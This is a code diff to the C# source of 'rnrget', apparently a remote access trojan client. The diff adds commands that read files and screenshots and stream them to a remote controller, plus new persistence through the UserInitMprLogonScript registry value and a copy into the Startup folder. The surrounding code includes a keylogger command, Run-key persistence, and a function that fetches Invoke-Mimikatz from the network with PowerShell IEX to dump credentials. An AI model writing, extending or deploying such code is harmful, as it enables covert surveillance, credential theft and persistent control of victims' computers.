@@ -15,6 +15,7 @@ using System.Drawing.Imaging;
 using System.Collections;
 using Microsoft.Win32;
 using System.Collections.Generic;
+using Microsoft.Win32.TaskScheduler;
 
 namespace rnrclient
 {
@@ -36,6 +37,12 @@ namespace rnrclient
             NetworkStream stream = client.GetStream();
             byte[] send = System.Text.Encoding.ASCII.GetBytes(s);
             stream.Write(send, 0, send.Length);
+        }
+        static void sendfile(string path)
+        {
+            NetworkStream stream = client.GetStream();
+            byte[] file = System.IO.File.ReadAllBytes(path);
+            stream.Write(file, 0, file.Length);
         }
         static void connect()
         {
@@ -96,6 +103,10 @@ namespace rnrclient
                     {
                         send(enumdir(args[1]));
                     }
+                    else if (args[0] == "pwd")
+                    {
+                        send(pwd());
+                    }
                     else if (args[0] == "mkdir")
                     {
                         mkdir(args[1]);
@@ -126,7 +137,12 @@ namespace rnrclient
                     }
                     else if (args[0] == "screencap")
                     {
-                        screencap(args[1]);
+                        string path = screencap(args[1]);
+                        sendfile(path);
+                    }
+                    else if (args[0] == "sendfile")
+                    {
+                        sendfile(args[1]);
                     }
                     else if (args[0] == "persist")
                     {
@@ -307,6 +323,10 @@ namespace rnrclient
             }
             return response.ToString();
         }
+        static string pwd()
+        {
+            return Environment.CurrentDirectory;
+        }
         static void mkdir(string dir)
         {
             System.IO.Directory.CreateDirectory(dir);
@@ -331,12 +351,13 @@ namespace rnrclient
         {
             return System.IO.File.ReadAllText(path);
         }
-        static void screencap(string dest)
+        static string screencap(string dest)
         {
             Bitmap screencap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
             Graphics graphics = Graphics.FromImage(screencap as Image);
             graphics.CopyFromScreen(0, 0, 0, 0, screencap.Size);
             screencap.Save(dest, ImageFormat.Jpeg);
+            return dest;
         }
         static void run(string proc)
         {
@@ -367,6 +388,24 @@ namespace rnrclient
             var split = Environment.CommandLine.Split();
             Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "rnrget", split[0]);
         }
+        static void persist(string type)
+        {
+            var split = Environment.CommandLine.Split();
+            var path = split[0];
+            if (type == "logonscript")
+            {
+                Registry.SetValue("HKEY_CURRENT_USER\\Environment\\UserInitMprLogonScript", "rnrget", path);
+            }
+            else if (type == "startup")
+            {
+                System.IO.File.Copy(path, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\rnrget.exe");
+            }
+            else if  (type == "schtask")
+            {
+                //
+            }
+
+        }
         static void mimikatz()
         {
             string args = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m";
@@ -393,9 +432,12 @@ namespace rnrclient
             response.Append("grep         case sensisitive grep       rnrget.exe grep <pattern> <path>, rnrget.exe grep foo bar.txt\n");
             response.Append("hostinfo     get host information        rnrget.exe hostinfo\n");
             response.Append("keylog       log key strokes             rnrget.exe keylog\n");
+            response.Append("mimi         invoke-mimikatz             rnrget.exe mimi\n");
             response.Append("mv           move files                  rnrget.exe mv <source> <destination>, rnrget.exe mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file\n");
             response.Append("mkdir        create directory            rnrget.exe mkdir <target dir>, rnrget.exe mkdir C:\\Users\\Admin\\NewDir\n");
+            response.Append("persist      pick yo persistence         rnrget.exe persist logonscript or startup or schtask");
             response.Append("ps           get process listing         rnrget.exe ps\n");
+            response.Append("pwd          print working directory     rnrget.exe pwd\n");
             response.Append("cat          read text from file         rnrget.exe cat <target path>, rnrget.exe cat C:\\Users\\Admin\\helloworld.txt\n");
             response.Append("run          run processes               rnrget.exe run <target path>, rnrget.exe run calc.exe\n");
             response.Append("runadmin     run processes as admin      rnrget.exe runadmin <target path>, runadmin calc.exe\n");
